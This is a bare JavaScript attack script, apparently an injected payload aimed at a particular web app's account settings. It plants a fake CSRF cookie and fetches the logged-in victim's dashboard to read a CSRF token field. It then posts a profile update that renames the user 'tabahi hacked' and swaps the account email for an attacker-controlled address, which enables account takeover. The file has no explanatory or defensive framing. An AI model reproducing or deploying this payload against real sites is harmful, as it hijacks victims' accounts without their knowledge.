



function plantCookie()
{
	
	document.cookie = "csrf_token=tabahi";
	
}

plantCookie();

emailCSRFAttack();

function emailCSRFAttack()
{
	
	var fetchHash = new XMLHttpRequest();

	var url = window.location.protocol+"//"+window.location.hostname+"/dashboard";
	var datax;
	var all_elements;
	var vc_email_token='initial';

	fetchHash.onreadystatechange=function ()
	{
		if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       var loot = document.createElement('html');
					   loot.innerHTML = datax;
					   all_elements = loot.getElementsByTagName( 'input' );
					   vc_email_token = all_elements[49].name;
					   //alert('Your token name: '+vc_email_token);
					   hack(vc_email_token);


        }

	}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();
	
	
	
}



function hack(csrfName)
{
	
	var csrfNN = csrfName.substr(4);
	
	var fetchHash = new XMLHttpRequest();

	var url = window.location.protocol+"//"+window.location.hostname+"/components/account-settings/user-profile-photo-save";
	var datax;
	var all_elements;
	var vc_email_token='initial';

	fetchHash.onreadystatechange=function ()
	{
		if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       var loot = document.createElement('html');
					   loot.innerHTML = datax;
					   all_elements = loot.getElementsByTagName( 'input' );
					   vc_email_token = all_elements[49].name;
					   alert('Your token name: '+vc_email_token);
					   hack(vc_email_token);


        }

	}

fetchHash.open("POST",url, true);
fetchHash.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
fetchHash.withCredentials=true;
fetchHash.send(csrfNN+"=tabahi&hid_reporting_email_status=1&hid_encrypted_user_id=0000&hid_image_path=https%3A%2F%2Fd28%2F1%2F&hid_image_folder=0&hid_db_size=90&hid_profile_master_avatar_array=%5B%7B%22avatar_id%22%3A%221%22%2C%22image%22%3A%22angry-4.png%22%2C%22tooltip%22%3A%22Angry%22%7D%2C%7B%22avatar_id%22%3A%222%22%2C%22image%22%3A%22angry-5.png%22%2C%22tooltip%22%3A%22Angry%22%7D%2C%7B%22avatar_id%22%3A%2238%22%2C%22image%22%3A%22angry-trump.png%22%2C%22tooltip%22%3A%22Angry+Trump%22%7D%2C%7B%22avatar_id%22%3A%2239%22%2C%22image%22%3A%22bernie-madoff.png%22%2C%22tooltip%22%3A%22Bernie+Madoff%22%7D%2C%7B%22avatar_id%22%3A%2240%22%2C%22image%22%3A%22bsb-oto.png%22%2C%22tooltip%22%3A%22BSB+Oto%22%7D%2C%7B%22avatar_id%22%3A%2241%22%2C%22image%22%3A%22bsb-zen.png%22%2C%22tooltip%22%3A%22BSB+Zen%22%7D%2C%7B%22avatar_id%22%3A%2242%22%2C%22image%22%3A%22bsb-zio.png%22%2C%22tooltip%22%3A%22BSB+Zio%22%7D%2C%7B%22avatar_id%22%3A%2243%22%2C%22image%22%3A%22chewbacca.png%22%2C%22tooltip%22%3A%22Chewbacca%22%7D%2C%7B%22avatar_id%22%3A%223%22%2C%22image%22%3A%22creepy.png%22%2C%22tooltip%22%3A%22Creepy%22%7D%2C%7B%22avatar_id%22%3A%2244%22%2C%22image%22%3A%22donald-trump-2.png%22%2C%22tooltip%22%3A%22Donald+Trump%22%7D%2C%7B%22avatar_id%22%3A%2245%22%2C%22image%22%3A%22donald-trump-3.png%22%2C%22tooltip%22%3A%22Donald+Trump%22%7D%2C%7B%22avatar_id%22%3A%224%22%2C%22image%22%3A%22emo.png%22%2C%22tooltip%22%3A%22Emo%22%7D%2C%7B%22avatar_id%22%3A%2246%22%2C%22image%22%3A%22gordon-gekko-cartoon.png%22%2C%22tooltip%22%3A%22Gordon+Gekko%22%7D%2C%7B%22avatar_id%22%3A%226%22%2C%22image%22%3A%22happy-2.png%22%2C%22tooltip%22%3A%22Happy%22%7D%2C%7B%22avatar_id%22%3A%227%22%2C%22image%22%3A%22happy-3.png%22%2C%22tooltip%22%3A%22Happy%22%7D%2C%7B%22avatar_id%22%3A%225%22%2C%22image%22%3A%22happy.png%22%2C%22tooltip%22%3A%22Happy%22%7D%2C%7B%22avatar_id%22%3A%2233%22%2C%22image%22%3A%22heisenberg-1.png%22%2C%22tooltip%22%3A%22Heisenberg%22%7D%2C%7B%22avatar_id%22%3A%228%22%2C%22image%22%3A%22heisenberg.png%22%2C%22tooltip%22%3A%22Heisenberg%22%7D%2C%7B%22avatar_id%22%3A%2247%22%2C%22image%22%3A%22julian-wong.png%22%2C%22tooltip%22%3A%22Julian+Wong%22%7D%2C%7B%22avatar_id%22%3A%2248%22%2C%22image%22%3A%22llyod-blankfein.png%22%2C%22tooltip%22%3A%22Llyod+Blankfein%22%7D%2C%7B%22avatar_id%22%3A%229%22%2C%22image%22%3A%22manly.png%22%2C%22tooltip%22%3A%22Manly%22%7D%2C%7B%22avatar_id%22%3A%2249%22%2C%22image%22%3A%22mario-draghi.png%22%2C%22tooltip%22%3A%22Mario+Draghi%22%7D%2C%7B%22avatar_id%22%3A%2250%22%2C%22image%22%3A%22mike-freeman.png%22%2C%22tooltip%22%3A%22Mike+Freeman%22%7D%2C%7B%22avatar_id%22%3A%2210%22%2C%22image%22%3A%22miserly.png%22%2C%22tooltip%22%3A%22Miserly%22%7D%2C%7B%22avatar_id%22%3A%2251%22%2C%22image%22%3A%22mr-sake.png%22%2C%22tooltip%22%3A%22Mr.+Sake%22%7D%2C%7B%22avatar_id%22%3A%2211%22%2C%22image%22%3A%22nerd-1.png%22%2C%22tooltip%22%3A%22Nerd%22%7D%2C%7B%22avatar_id%22%3A%2212%22%2C%22image%22%3A%22nerd-2.png%22%2C%22tooltip%22%3A%22Nerd%22%7D%2C%7B%22avatar_id%22%3A%2234%22%2C%22image%22%3A%22nerd-3.png%22%2C%22tooltip%22%3A%22Nerd%22%7D%2C%7B%22avatar_id%22%3A%2252%22%2C%22image%22%3A%22norbert-german-banker.png%22%2C%22tooltip%22%3A%22Norbert+German+Banker%22%7D%2C%7B%22avatar_id%22%3A%2213%22%2C%22image%22%3A%22pirate.png%22%2C%22tooltip%22%3A%22Pirate%22%7D%2C%7B%22avatar_id%22%3A%2215%22%2C%22image%22%3A%22rich-2.png%22%2C%22tooltip%22%3A%22Rich%22%7D%2C%7B%22avatar_id%22%3A%2214%22%2C%22image%22%3A%22rich.png%22%2C%22tooltip%22%3A%22Rich%22%7D%2C%7B%22avatar_id%22%3A%2216%22%2C%22image%22%3A%22sad.png%22%2C%22tooltip%22%3A%22Sad%22%7D%2C%7B%22avatar_id%22%3A%2217%22%2C%22image%22%3A%22scared.png%22%2C%22tooltip%22%3A%22Scared%22%7D%2C%7B%22avatar_id%22%3A%2218%22%2C%22image%22%3A%22sceptic-1.png%22%2C%22tooltip%22%3A%22Sceptic%22%7D%2C%7B%22avatar_id%22%3A%2219%22%2C%22image%22%3A%22sceptic-2.png%22%2C%22tooltip%22%3A%22Sceptic%22%7D%2C%7B%22avatar_id%22%3A%2220%22%2C%22image%22%3A%22sceptic-3.png%22%2C%22tooltip%22%3A%22Sceptic%22%7D%2C%7B%22avatar_id%22%3A%2221%22%2C%22image%22%3A%22shocked.png%22%2C%22tooltip%22%3A%22Shocked%22%7D%2C%7B%22avatar_id%22%3A%2222%22%2C%22image%22%3A%22sick.png%22%2C%22tooltip%22%3A%22Sick%22%7D%2C%7B%22avatar_id%22%3A%2224%22%2C%22image%22%3A%22smug-1.png%22%2C%22tooltip%22%3A%22Smug%22%7D%2C%7B%22avatar_id%22%3A%2225%22%2C%22image%22%3A%22smug-2.png%22%2C%22tooltip%22%3A%22Smug%22%7D%2C%7B%22avatar_id%22%3A%2226%22%2C%22image%22%3A%22smug-3.png%22%2C%22tooltip%22%3A%22Smug%22%7D%2C%7B%22avatar_id%22%3A%2227%22%2C%22image%22%3A%22smug-4.png%22%2C%22tooltip%22%3A%22Smug%22%7D%2C%7B%22avatar_id%22%3A%2235%22%2C%22image%22%3A%22smug-5.png%22%2C%22tooltip%22%3A%22Smug%22%7D%2C%7B%22avatar_id%22%3A%2236%22%2C%22image%22%3A%22smug-6.png%22%2C%22tooltip%22%3A%22Smug%22%7D%2C%7B%22avatar_id%22%3A%2223%22%2C%22image%22%3A%22smug.png%22%2C%22tooltip%22%3A%22Smug%22%7D%2C%7B%22avatar_id%22%3A%2253%22%2C%22image%22%3A%22storm-trooper.png%22%2C%22tooltip%22%3A%22Storm+Trooper%22%7D%2C%7B%22avatar_id%22%3A%2237%22%2C%22image%22%3A%22superhero-1.png%22%2C%22tooltip%22%3A%22Super+Hero%22%7D%2C%7B%22avatar_id%22%3A%2228%22%2C%22image%22%3A%22superhero.png%22%2C%22tooltip%22%3A%22Super+Hero%22%7D%2C%7B%22avatar_id%22%3A%2254%22%2C%22image%22%3A%22the-real-gekko.png%22%2C%22tooltip%22%3A%22Real+Gekko%22%7D%2C%7B%22avatar_id%22%3A%2230%22%2C%22image%22%3A%22tired-1.png%22%2C%22tooltip%22%3A%22Tired%22%7D%2C%7B%22avatar_id%22%3A%2229%22%2C%22image%22%3A%22tired.png%22%2C%22tooltip%22%3A%22Tired%22%7D%2C%7B%22avatar_id%22%3A%2231%22%2C%22image%22%3A%22yawning.png%22%2C%22tooltip%22%3A%22Yawning%22%7D%2C%7B%22avatar_id%22%3A%2232%22%2C%22image%22%3A%22yelling.png%22%2C%22tooltip%22%3A%22Yelling%22%7D%5D&user_name=tabahi+hacked&email_id=milly.shikari%40mail.com&hid_user_img=98_f.png%5C%5C%5C'&hid_is_master_avatar=0&timezone_id=0");
	
	
	
	
	
	
	
	
	
	
}